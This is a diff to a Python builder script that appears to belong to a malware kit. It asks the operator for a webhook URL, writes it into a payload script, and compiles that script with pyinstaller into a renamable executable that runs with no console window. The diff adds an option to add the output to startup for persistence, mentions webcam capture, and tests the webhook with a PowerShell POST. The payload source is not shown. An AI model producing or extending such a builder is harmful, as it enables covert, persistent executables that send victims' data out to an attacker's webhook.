@@ -5,7 +5,7 @@ from colorama import Fore, Style, init
 import time
 import sys
 
-
+# Initialize colorama
 init(autoreset=True)
 
 def display_ascii_art():
@@ -24,7 +24,7 @@ def display_ascii_art():
     """
     print(Fore.LIGHTBLUE_EX + ascii_art)
 
-
+# Cool loading animation with dynamic spinner and alternating colors
 def loading_animation(message, color_sequence=None, duration=5):
     if color_sequence is None:
         color_sequence = [Fore.LIGHTYELLOW_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTMAGENTA_EX]
@@ -47,18 +47,30 @@ def loading_animation(message, color_sequence=None, duration=5):
     print()  # Just move to the next line, don't say "Done!"
 
 def main():
-  
+    # Display ASCII art
     display_ascii_art()
 
-   
-    webhook = input(Fore.LIGHTGREEN_EX + "Enter the webhook URL: ")
+    # Ask if the user wants to add webcam capture
+    add_webcam = input(Fore.LIGHTYELLOW_EX + "Do you want the output to be added to startup? (y/n): ").strip().lower()
 
+    # Determine which script to compile based on user input
+    if add_webcam == 'y':
+        script_to_compile = "startup.py"
+    elif add_webcam == 'n':
+        script_to_compile = "script.py"
+    else:
+        print(Fore.RED + 'Invalid input. Please type "y" for yes or "n" for no.')
+        return
 
+    # Prompt the user to enter the webhook URL
+    webhook = input(Fore.LIGHTYELLOW_EX + "Enter the webhook URL: ")
+
+    # Ask if the user wants to test the webhook
     test_webhook = input(Fore.LIGHTGREEN_EX + "Do you want to test the webhook? (y/n): ").strip().lower()
     if test_webhook == 'y':
         loading_animation("Testing the webhook", duration=3)
         
-     
+        # Test the webhook using subprocess
         test_command = f"powershell -Command \"try {{Invoke-RestMethod -Uri '{webhook}' -Method POST -ContentType 'application/json' -Body '{{\\\"content\\\":\\\"goob says hi, say hi to goob\\\"}}'; exit 0}} catch {{exit 1}}\""
         result = subprocess.run(test_command, shell=True)  # Using subprocess.run()
 
@@ -67,21 +79,21 @@ def main():
             input("Press any key to exit...")
             return
         else:
-            print(Fore.LIGHTGREEN_EX + "Webhook is valid. Proceeding with the build.")
+            print(Fore.LIGHTYELLOW_EX + "Webhook is valid. Proceeding with the build.")
     else:
-        print(Fore.LIGHTYELLOW_EX + "Skipping webhook test.")
+        print(Fore.LIGHTGREEN_EX + "Skipping webhook test.")
 
-   
-    shutil.copyfile("SRC/script.py", "SRC/script_backup.py")
+    # Copy the selected script to a backup
+    shutil.copyfile(f"SRC/{script_to_compile}", f"SRC/{script_to_compile}_backup.py")
 
- 
-    with open("SRC/script.py", 'r') as file:
+    # Replace {{WEBHOOK}} in the selected script with the webhook URL
+    with open(f"SRC/{script_to_compile}", 'r') as file:
         script_content = file.read()
     script_content = script_content.replace('{{WEBHOOK}}', webhook)
-    with open("SRC/script.py", 'w') as file:
+    with open(f"SRC/{script_to_compile}", 'w') as file:
         file.write(script_content)
 
-    
+    # Prompt the user if they want to rename the output executable
     while True:
         rename = input(Fore.LIGHTGREEN_EX + "Do you want to rename the output executable? (y/n): ").strip().lower()
         if rename == 'y':
@@ -89,21 +101,21 @@ def main():
             output_file = f"dist/{newname}.exe"
             break
         elif rename == 'n':
-            output_file = "dist/script.exe"
+            output_file = "dist/script.exe"  # Default name
             break
         else:
             print(Fore.RED + 'Invalid input. Please type "y" for yes or "n" for no.')
 
-    
+    # Build the executable
     loading_animation("Building the executable", [Fore.MAGENTA, Fore.CYAN, Fore.LIGHTYELLOW_EX], duration=5)  # Cool loading animation
 
-    
-    build_command = f"pyinstaller --onefile --noconsole --distpath dist --workpath build --specpath build SRC/script.py --name {'script' if rename == 'n' else newname}"
+    # Compilation starts immediately after the animation without "Done!" message
+    build_command = f"pyinstaller --onefile --noconsole --distpath dist --workpath build --specpath build SRC/{script_to_compile} --name {'script' if rename == 'n' else newname}"
     subprocess.run(build_command, shell=True)  # Using subprocess.run()
 
-  
-    shutil.copyfile("SRC/script_backup.py", "SRC/script.py")
-    os.remove("SRC/script_backup.py")
+    # Restore the original script
+    shutil.copyfile(f"SRC/{script_to_compile}_backup.py", f"SRC/{script_to_compile}")
+    os.remove(f"SRC/{script_to_compile}_backup.py")
 
     print(Fore.LIGHTCYAN_EX + f"Build complete! The executable is in the 'dist' folder as '{output_file}'.")
     input("Press any key to exit...")
